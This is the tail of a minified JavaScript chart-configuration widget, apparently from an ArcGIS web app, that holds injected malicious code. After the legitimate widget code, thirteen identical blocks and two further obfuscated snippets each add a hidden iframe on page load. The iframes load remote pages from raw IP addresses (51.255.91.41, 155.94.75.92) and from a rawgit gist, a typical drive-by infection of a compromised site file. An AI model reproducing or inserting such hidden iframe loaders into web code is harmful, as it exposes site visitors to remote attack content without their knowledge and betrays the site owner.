this._hideTooltipDialog(f):(this._showTooltipDialog(f,a),e.addClass(a,"selected"))):(this.columnTTD.isOpendNow?(a=this.columnEdit,f=this.columnTTD):this.pieTTD.isOpendNow?(a=this.pieEdit,f=this.pieTTD):this.barTTD.isOpendNow?(a=this.barEdit,f=this.barTTD):this.lineTTD.isOpendNow&&(a=this.lineEdit,f=this.lineTTD),f?(c=b===f.domNode,b=e.isDescendant(b,f.domNode),c||b?(this._hideAllParamsTooltipDialogs(),this._showTooltipDialog(f,a),e.addClass(a,"selected")):this._hideAllParamsTooltipDialogs()):this._hideAllParamsTooltipDialogs())})))},
_createParametersDialog:function(a,c,b){a=e.create("div");b.placeAt(a);return new p({content:a})},_unselectEditDivs:function(){e.removeClass(this.columnEdit,"selected");e.removeClass(this.pieEdit,"selected");e.removeClass(this.barEdit,"selected");e.removeClass(this.lineEdit,"selected")},_showEditDiv:function(a){e.setStyle(a,"display","inline-block")},_hideEditDiv:function(a){e.setStyle(a,"display","none")},_initPreview:function(){this.preview=new F({map:null,isBigPreview:!1,showSettingIcon:!1,showZoomIcon:!1,
zoomToFeaturesWhenClick:!1});this.preview.placeAt(this.previewDiv);this.preview.startup()},_onChartModeChanged:function(){var a=(this.chartModeSelect.get("value")||"")+"-tr",c=m(".detail-tr",this.detailsTable);l.forEach(c,d.hitch(this,function(b){e.hasClass(b,a)?e.addClass(b,"show-tr"):e.removeClass(b,"show-tr")}));this._updateChartTypes();this._updateParametersDijit()},_onChartNameBlurred:function(){var a=h.stripHTML(this.chartNameTextBox.get("value"));this.chartNameTextBox.set("value",a)},_onChartNameChanged:function(){this.emit("name-change",
this.chartNameTextBox.get("value"))},_onDescriptionBlurred:function(){this.descriptionTA.value=h.stripHTML(this.descriptionTA.value)},_clear:function(){this._layerDefinition=null;this.urlTextBox.set("value","");this.filter.reset();this.chartNameTextBox.set("value","");this.descriptionTA.value="";this.chartModeSelect.removeOption(this.chartModeSelect.getOptions());this.categoryFieldSelect.removeOption(this.categoryFieldSelect.getOptions());this.categoryOperationSelect.set("value","sum");this.fieldOperationSelect.set("value",
"sum");this.valueFields.clear();this.featureAxisLabelSelect.removeOption(this.featureAxisLabelSelect.getOptions());this.ascRadio.checked=!0;this.columnCbx.checked=!1;this.pieCbx.checked=!1;this.barCbx.checked=!1;this.lineCbx.checked=!1;this.columnParameters.reset();this.pieParameters.reset();this.barParameters.reset();this.lineParameters.reset();this.symbolPicker.reset();this.colorPicker.setColor(new q(this._highLightColor));this.preview.clear()},_onBtnSetClicked:function(){var a=new D({titleLabel:this.nls.setDataSource,
dijitArgs:{multiple:!1,createMapResponse:this.map.webMapResponse,portalUrl:this.appConfig.portalUrl,style:{height:"100%"}}});this.own(k(a,"ok",d.hitch(this,function(c){var b=a.getSelectedRadioType();a.close();a=null;this.setNewLayerDefinition(c,b,null,null)})));this.own(k(a,"cancel",d.hitch(this,function(){a.close();a=null})));a.startup()},_hasNumberFields:function(a){var c=!1;(a=a.fields)&&0<a.length&&(c=l.some(a,d.hitch(this,function(a){return 0<=this._numberFieldTypes.indexOf(a.type)})));return c},
setNewLayerDefinition:function(a,c,b,d){a.definition.name=a.name;a.definition.url=a.url;a.url!==(this._layerDefinition&&this._layerDefinition.url)&&this._resetByNewLayerDefinition(a,c,b,d)},_resetByNewLayerDefinition:function(a,c,b,d){var g=a.definition;this._addAliasForLayerInfo(g);this._clear();if(g){var f=null;"map"===c&&a.layerInfo&&(f=a.layerInfo.id);this._layerDefinition=g;this._webMapLayerId=f;a=g.url;this.urlTextBox.set("value",a);this.filter.reset();this._layerDefinition&&this.filter.buildByExpr(a,
d||"1\x3d1",this._layerDefinition);this.chartNameTextBox.set("value",b||g.name);this._resetFieldsDijitsByLayerInfo(this._layerDefinition);b=h.getTypeByGeometryType(g.geometryType);d="";"point"===b?d="marker":"polyline"===b?d="line":"polygon"===b&&(d="fill");d&&this.symbolPicker.showByType(d)}},_resetFieldsDijitsByLayerInfo:function(a){this.chartModeSelect.removeOption(this.chartModeSelect.getOptions());this._hasNumberFields(a)?(this.chartModeSelect.addOption({value:"feature",label:this.nls.featureOption}),
this.chartModeSelect.addOption({value:"category",label:this.nls.categoryOption}),this.chartModeSelect.addOption({value:"count",label:this.nls.countOption}),this.chartModeSelect.addOption({value:"field",label:this.nls.fieldOption}),this.chartModeSelect.set("value","feature")):(this.chartModeSelect.addOption({value:"count",label:this.nls.countOption}),this.chartModeSelect.set("value","count"));var c=a.displayField;a=d.clone(a.fields);var b=[this._stringFieldType,this._dateFieldType],b=b.concat(d.clone(this._numberFieldTypes)),
g=l.filter(a,d.hitch(this,function(a){return 0<=b.indexOf(a.type)}));this.categoryFieldSelect.removeOption(this.categoryFieldSelect.getOptions());var e="";l.forEach(g,d.hitch(this,function(a){this.categoryFieldSelect.addOption({value:a.name,label:a.alias});a.name===c&&(e=c)}));this.categoryFieldSelect.set("value",e);var f=[this._stringFieldType,this._oidFieldType,this._dateFieldType].concat(d.clone(this._numberFieldTypes)),g=l.filter(a,d.hitch(this,function(a){return 0<=f.indexOf(a.type)}));this.featureAxisLabelSelect.removeOption(this.featureAxisLabelSelect.getOptions());
var h="";l.forEach(g,d.hitch(this,function(a){var b={value:a.name,label:a.name||a.alias};c?a.name===c&&(h=a.name):a.type===this._oidFieldType&&(h=a.name);this.featureAxisLabelSelect.addOption(b)}));this.featureAxisLabelSelect.set("value",h);a=l.filter(a,d.hitch(this,function(a){return 0<=this._numberFieldTypes.indexOf(a.type)}));this.valueFields.setFields(a)},_addAliasForLayerInfo:function(a){a&&a.fields&&0<a.fields.length&&l.forEach(a.fields,d.hitch(this,function(a){a.name&&!a.alias&&(a.alias=a.name)}))},
_resetByConfig:function(a,c){this._addAliasForLayerInfo(c);this._clear();var b=d.clone(a);this._layerDefinition=c;this._webMapLayerId=b.webMapLayerId;this.urlTextBox.set("value",b.url);this.filter.buildByFilterObj(c.url,b.filter,c);this.chartNameTextBox.set("value",b.name||c.name||"");this.descriptionTA.value=b.description||"";this._resetFieldsDijitsByLayerInfo(c);this.chartModeSelect.set("value",b.mode);a=d.hitch(this,function(){var a=this._getChartTypeDisplayConfig(b,"pie");a&&(this.pieParameters.setConfig(a),
this.pieCbx.checked=!0,this._showEditDiv(this.pieEdit))});"feature"===b.mode?(this.featureAxisLabelSelect.set("value",b.labelField),this.valueFields.selectFields(b.valueFields),b.sortOrder.isAsc?this.ascRadio.checked=!0:this.desRadio.checked=!0,1>=b.valueFields.length&&a()):"category"===b.mode?(this.categoryFieldSelect.set("value",b.categoryField),this.categoryOperationSelect.set("value",b.operation),this.valueFields.selectFields(b.valueFields),b.sortOrder.isAsc?this.ascRadio.checked=!0:this.desRadio.checked=
!0,1>=b.valueFields.length&&a()):"count"===b.mode?(this.categoryFieldSelect.set("value",b.categoryField),b.sortOrder.isAsc?this.ascRadio.checked=!0:this.desRadio.checked=!0,a()):"field"===b.mode&&(this.fieldOperationSelect.set("value",b.operation),this.valueFields.selectFields(b.valueFields),a());if(a=this._getChartTypeDisplayConfig(b,"column"))this.columnParameters.setConfig(a),this.columnCbx.checked=!0,this._showEditDiv(this.columnEdit);if(a=this._getChartTypeDisplayConfig(b,"bar"))this.barParameters.setConfig(a),
this.barCbx.checked=!0,this._showEditDiv(this.barEdit);if(a=this._getChartTypeDisplayConfig(b,"line"))this.lineParameters.setConfig(a),this.lineCbx.checked=!0,this._showEditDiv(this.lineEdit);a=J.fromJson(b.symbol);this.symbolPicker.showBySymbol(a);this.colorPicker.setColor(new q(b.highLightColor))},_getChartTypeDisplayConfig:function(a,c){if(a&&a.types&&0<a.types.length)for(var b=0;b<a.types.length;b++)if(a.types[b].type===c)return a.types[b].display;return null},_updatePreview:function(){this.preview.clear();
var a=this.getConfig(!0);if(a){var c=new I;c.returnGeometry=!1;c.where=a.filter.expr||"1\x3d1";c.outFields=[];"feature"===a.mode?(c.outFields=d.clone(a.valueFields),0>c.outFields.indexOf(a.labelField)&&(c.outFields=[a.labelField].concat(c.outFields))):"category"===a.mode?(c.outFields=d.clone(a.valueFields),0>c.outFields.indexOf(a.categoryField)&&(c.outFields=[a.categoryField].concat(c.outFields))):"count"===a.mode?c.outFields=[a.categoryField]:"field"===a.mode&&(c.outFields=d.clone(a.valueFields));
this.tab.showShelter();this.showBigShelter();this._queryFeatures(c,a.url).then(d.hitch(this,function(b){if(this.domNode){var c=e.getContentBox(this.domNode.parentNode);e.setStyle(this.preview.domNode,"height",Math.max(c.h-60,150)+"px");b=b.slice(0,this.maxPreviewFeaturesCount);this.preview.createClientCharts(this._layerDefinition.url,b,a);this.tab.hideShelter();this.hideBigShelter()}}),d.hitch(this,function(a){this.domNode&&(console.error(a),this.tab.hideShelter(),this.hideBigShelter())}))}},_queryFeatures:function(a,
c){var b=new w;(new t(c)).execute(a).then(d.hitch(this,function(a){b.resolve(a.features||[])}),d.hitch(this,function(e){e&&400===e.code?(a.outFields=["*"],(new t(c)).execute(a).then(d.hitch(this,function(a){b.resolve(a)}),d.hitch(this,function(a){b.reject(a)}))):b.reject(e)}));return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});